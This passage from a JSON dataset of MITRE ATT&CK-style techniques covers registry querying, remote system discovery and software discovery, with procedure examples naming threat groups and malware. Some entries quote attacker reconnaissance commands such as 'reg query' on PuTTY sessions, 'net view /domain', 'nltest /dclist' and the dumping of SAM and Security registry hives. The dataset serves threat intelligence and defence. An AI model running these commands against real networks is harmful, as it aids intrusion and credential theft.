keys."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor can query the Windows Registry to gather system information. "}, {"id": "G0087", "name": "APT39", "description": "APT39 has used various strains of malware to query the Registry."}, {"id": "G0096", "name": "APT41", "description": "APT41 queried registry values to determine items such as configured RDP ports and network configurations."}, {"id": "S0438", "name": "Attor", "description": "Attor has opened the registry and performed query searches."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can check for installed software on the system under the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE is capable of enumerating and making modifications to an infected system's Registry."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot searches for certain Registry keys to be configured before executing the payload."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can query Windows\\CurrentVersion\\Uninstall for installed applications."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear can query the host's Registry key at HKEY_CURRENT_USER\\Console\\QuickEdit to retrieve data."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used the RegQueryValueExA function to retrieve proxy information in the Registry."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can use the RegEnumKeyW to iterate through Registry keys."}, {"id": "S0252", "name": "Brave Prince", "description": "Brave Prince gathers information about the Registry."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can check the Registry for specific keys."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has searched the Image File Execution Options registry key for \"Debugger\" within every subkey."}, {"id": "S0335", "name": "Carbon", "description": "Carbon enumerates values in the Registry."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT contains watchdog functionality that periodically ensures HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load is set to point to its executable."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower has the ability to enumerate Uninstall registry values."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has queried Registry keys using reg query \\\\HKU\\\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK provides access to the Windows Registry, which can be used to gather information."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to enumerate Registry keys, including KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir to search for a bitcoin wallet."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can query HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\  to determine if the security setting for restricting default programmatic access is enabled."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT can check the default browser by querying HKCR\\http\\shell\\open\\command."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can check the Registry for the presence of HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate to determine how long it has been installed on a host."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly used Reg to dump the Security Account Manager (SAM), System, and Security Windows registry hives from victim machines."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can query the Registry to determine if it has already been installed on the system."}, {"id": "S0354", "name": "Denis", "description": "Denis queries the Registry for keys and values."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of enumerating Registry keys and values."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper searches and reads the value of the Windows Update Registry Run key."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has queried the Registry to identify victim information."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate Registry items."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the rem reg query command to obtain values from Registry keys."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can get user agent strings for the default browser from HKCU\\Software\\Classes\\http\\shell\\open\\command."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information. FELIXROOT has also used WMI to query the Windows Registry."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher queries Registry values as part of its anti-sandbox checks."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can check Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings to extract the ProxyServer string."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can open random files and Registry keys to obscure malware behavior from sandbox analysis."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0376", "name": "HOPLIGHT", "description": "A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\\CurrentControlSet\\Control\\Lsa Name."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used a service account to extract copies of the Security Registry hive."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer has a data wiper component that enumerates keys in the Registry HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can enumerate Registry values, keys, and data."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can enumerate Registry keys."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has obtained specific Registry keys and values on a compromised host."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can query the Registry to check for the presence of HKCU\\Software\\KasperskyLab."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can query the Registry for keys added to execute COM hijacking."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can check for existing stratum cryptomining information in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr \u2013 %stratum info%."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can enumerate Registry keys with all subkeys and values."}, {"id": "S1015", "name": "Milan", "description": "Milan can query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid to retrieve the machine GUID."}, {"id": "S1047", "name": "Mori", "description": "Mori can read data from the Registry including from HKLM\\Software\\NFC\\IPA andHKLM\\Software\\NFC\\."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can read specific registry values."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" on a victim to query the Registry."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, the threat actors executed /c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\ to detect recent PuTTY sessions, likely to further lateral movement."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo queries the registry to look for information about Terminal Services."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can search the registry files of a compromised host."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used shellcode which reads code stored in the registry keys \\REGISTRY\\SOFTWARE\\Microsoft\\DRM using the native Windows API as well as read HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces as part of its C2."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can enumerate and query for information contained within the Windows Registry."}, {"id": "S0145", "name": "POWERSOURCE", "description": "POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may query the Registry by running reg query on a victim."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY has the ability to retrieve information from the Registry."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer queries the Windows Registry to fingerprint the infected host via the HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid key."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses the command reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\"."}, {"id": "S0172", "name": "Reaver", "description": "Reaver queries the Registry to determine the correct Startup path to use for persistence."}, {"id": "S0075", "name": "Reg", "description": "Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface."}, {"id": "S0496", "name": "REvil", "description": "REvil can query the Registry to get random file extensions to append to encrypted files."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun has identified the OS product name from a compromised host by searching the registry for SOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can access the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used check_registry_keys as part of its environmental checks."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can query SOFTWARE\\Microsoft\\.NETFramework\\policy\\v2.0 for discovery."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon queries several Registry keys to identify hard disk partitions to overwrite."}, {"id": "S1019", "name": "Shark", "description": "Shark can query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid to retrieve the machine GUID."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has queried the registry for proxy server information."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use the GetRegValue function to check Registry keys within HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated and HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster has the ability to query the Registry to detect a key specific to VMware."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has looked in the registry to find the default browser path."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet searches the Registry for indicators of security programs."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid from compromised hosts."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can search for the HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System Registry key to gather system information."}, {"id": "S0242", "name": "SynAck", "description": "SynAck enumerates Registry keys associated with event logs."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can query the Registry on compromised hosts using RegQueryValueExA."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP checked that HKU\\SOFTWARE\\Microsoft\\CTF existed before decoding its embedded payload."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can read and decrypt stored Registry values."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can query the Registry for its configuration information."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes ."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can query the Registry, typically HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, to find the key and path to decrypt and load its kernel driver and kernel driver loader."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used Reg to query the Registry for installed programs."}, {"id": "S0476", "name": "Valak", "description": "Valak can use the Registry for code updates and to collect credentials."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer checks the system for certain Registry keys."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has queried the Registry on compromised systems, reg query hklm\\software\\, for information on installed software including PuTTY."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can query the Registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value OracleOcilib exists."}, {"id": "S0155", "name": "WINDSHIELD", "description": "WINDSHIELD can gather Registry values."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can search registry keys to identify antivirus programs on an compromised host."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy executes the reg query command to obtain information in the Registry."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda checks for the existence of a Registry key and if it contains certain values."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to query the Registry for proxy settings."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can query the netsvc group value data located in the svchost group Registry key."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ can search the registry of a compromised host."}], "sub_techniques": []}, {"name": "Remote System Discovery", "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.", "detailed_description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).", "id": "T1018", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. "}, {"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD."}, {"id": "S0552", "name": "AdFind", "description": "AdFind has the ability to query Active Directory for computers."}, {"id": "G1030", "name": "Agrius", "description": "Agrius used the tool NBTscan to scan for remote, accessible hosts in victim environments."}, {"id": "G1024", "name": "Akira", "description": "Akira uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can detect the existence of remote systems."}, {"id": "G0050", "name": "APT32", "description": "APT32 has enumerated DC servers using the command net group \"Domain Controllers\" /domain. The group has also used the ping command."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used NBTscan and custom tools to discover remote systems."}, {"id": "G0096", "name": "APT41", "description": "APT41 has used MiPing to discover active systems in the victim network."}, {"id": "S0099", "name": "Arp", "description": "Arp can be used to display a host's ARP cache, which may include address resolutions for remote systems."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea can enumerate and map ICS-specific systems in victim environments."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use a PowerShell object such as, System.Net.NetworkInformation.Ping to ping a computer."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can enumerate remote systems using  Net View."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can use net view to discover remote systems."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can use LDAP queries to connect to AD and iterate over connected workstations."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can enumerate and collect the properties of domain computers, including domain controllers."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER typically use ping and Net to enumerate systems."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used the commands net view /all /domain and ping to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration."}, {"id": "S0335", "name": "Carbon", "description": "Carbon uses the net view command."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network."}, {"id": "S0244", "name": "Comnie", "description": "Comnie runs the net view command"}, {"id": "S0575", "name": "Conti", "description": "Conti has the ability to discover hosts on a target network."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can discover active IP addresses, along with the machine name, within a targeted network."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has used ping to identify other machines of interest."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can use the ARP table to find remote hosts to scan."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has likely obtained a list of hosts in the victim environment."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can search for other machines connected to compromised host and attempt to map the network."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can use ping to identify remote hosts within the victim network."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used the command powershell \"Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr \"Address\"\" to find the network information of successfully logged-in accounts to discovery addresses of other machines. Earth Lusca has also used multiple scanning tools to discover other machines within the same compromised network."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used tools such as Nmap and MASSCAN for remote service discovery."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the net view command on the victim\u2019s machine."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used nltest.exe /dclist to retrieve a list of domain controllers."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to execute net view on a targeted system."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Angry IP Scanner to detect remote systems."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can collect information about hosts on the victim network."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used several tools and batch files to map victims' internal networks."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as ping to identify remote systems."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has enumerated domain controllers using net group \"Domain computers\" and nltest /dclist."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can find machines on the local network by gathering known local IP addresses through DNSGetCacheDataTable, GetIpNetTable,WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY),NetServerEnum,GetTcpTable, and GetAdaptersAddresses."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used net view to enumerate domain machines."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can enumerate remote computers in the compromised network."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used network scanning and enumeration tools, including Ping."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used a script to parse files like /etc/hosts and SSH known_hosts to discover remote systems."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of available servers with the command net view."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used Microsoft\u2019s Sysinternals tools to gather detailed information about remote systems."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used Ping for discovery on targeted networks."}, {"id": "G0045", "name": "menuPass", "description": "menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for performing ARP scans of local connected systems."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to identify remote hosts on connected networks."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used a netbios scanner for remote machine identification."}, {"id": "S0590", "name": "NBTscan", "description": "NBTscan can list NetBIOS computer names."}, {"id": "S0039", "name": "Net", "description": "Commands such as net view can be used in Net to gather information about available remote systems."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can identify remote hosts on connected networks."}, {"id": "S0359", "name": "Nltest", "description": "Nltest may be used to enumerate remote domain controllers using options such as /dclist and /dsgetdc."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer uses Windows Management Instrumentation to enumerate all systems in the network."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net view and ping commands as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used nbtscan and ping to discover remote systems, as well as dsquery subnet on a domain controller to retrieve all subnets in the Active Directory."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo performs a connection test to discover remote systems in the network"}, {"id": "S0097", "name": "Ping", "description": "Ping can be used to identify remote systems within a network."}, {"id": "G1040", "name": "Play", "description": "Play has used tools such as AdFind, Nltest, and BloodHound to enumerate shares and hostnames on compromised networks."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT used Nmap for remote system discovery."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can identify remote systems through the net view command."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA runs the net view /domain and net view commands."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can ping or traceroute a remote host."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools can enumerate Azure AD systems and devices."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider can enumerate remote systems, such as VMware vCenter infrastructure."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon scans the C-class subnet of the IPs on the victim's interfaces."}, {"id": "S0063", "name": "SHOTPUT", "description": "SHOTPUT has a command to list all servers in the domain, as well as one to locate domain controllers on a domain."}, {"id": "G0091", "name": "Silence", "description": "Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can enumerate and collect the properties of domain computers."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette can identify payment systems, payment gateways, and ATM systems in compromised environments."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot may use net view /domain to display hostnames of available systems on a network."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "The TAINTEDSCRIBE command and execution module can perform target system enumeration."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used the net view command."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used ping %REMOTE_HOST% for post exploit discovery."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can enumerate computers and network devices."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands. Turla has also used net group \"Domain Computers\" /domain, net group \"Domain Controllers\" /domain, and net group \"Exchange Servers\" /domain to enumerate domain computers, including the organization's DC and Exchange Server."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can use net view to gather information about remote systems."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used multiple methods, including Ping, to enumerate systems on compromised networks."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry scans its local network segment for remote systems to try to exploit and copy itself to."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind, nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller."}, {"id": "S0248", "name": "yty", "description": "yty uses the net view command for discovery."}], "sub_techniques": []}, {"name": "Software Discovery", "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.", "id": "T1518", "examples": [{"id": "S0534", "name": "Bazar", "description": "Bazar can query the Registry for installed applications."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used tools to enumerate software installed on an infected host."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has the ability to enumerate what browser is being used as well as version information for Safari."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can list the installed applications on a compromised host."}, {"id": "S0154", "name": "Cobalt Strike", "description": "The Cobalt Strike System Profiler can discover applications through the browser and identify the version of Java the target has."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT can check the victim's default browser to determine which process to inject its communications module into."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer has the ability to search systems for installed applications."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to gather information on installed applications."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has collected a list of installed software on the system."}, {"id": "S0062", "name": "DustySky", "description": "DustySky lists all installed software for the infected machine."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to identify installed programs on a compromised host."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has enumerated programs installed on an infected machine."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant can retrieve a list of applications from the SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths registry key."}, {"id": "G0100", "name": "Inception", "description": "Inception has enumerated installed software on compromised systems."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can collect information about installed software used by specific users, software executed on user login, and software executed by each system."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can collect information on installed applications."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can list installed software on compromised systems."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can check for the Telegram installation directory by enumerating the files on disk."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has searched the compromised system for banking applications."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has searched the victim system for the InstallUtil.exe program and its version."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors deployed a file called DeployJava.js to fingerprint installed software on a victim system prior to exploit delivery."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors collected a list of installed software on the infected system."}, {"id": "S0229", "name": "Orz", "description": "Orz can gather the victim's Internet Explorer version."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can list PHP server configuration details."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can enumerate a list of installed programs."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer is capable of identifying running software on victim machines."}, {"id": "S0148", "name": "RTM", "description": "RTM can scan victim drives to look for specific banking software on the machine to determine next actions."}, 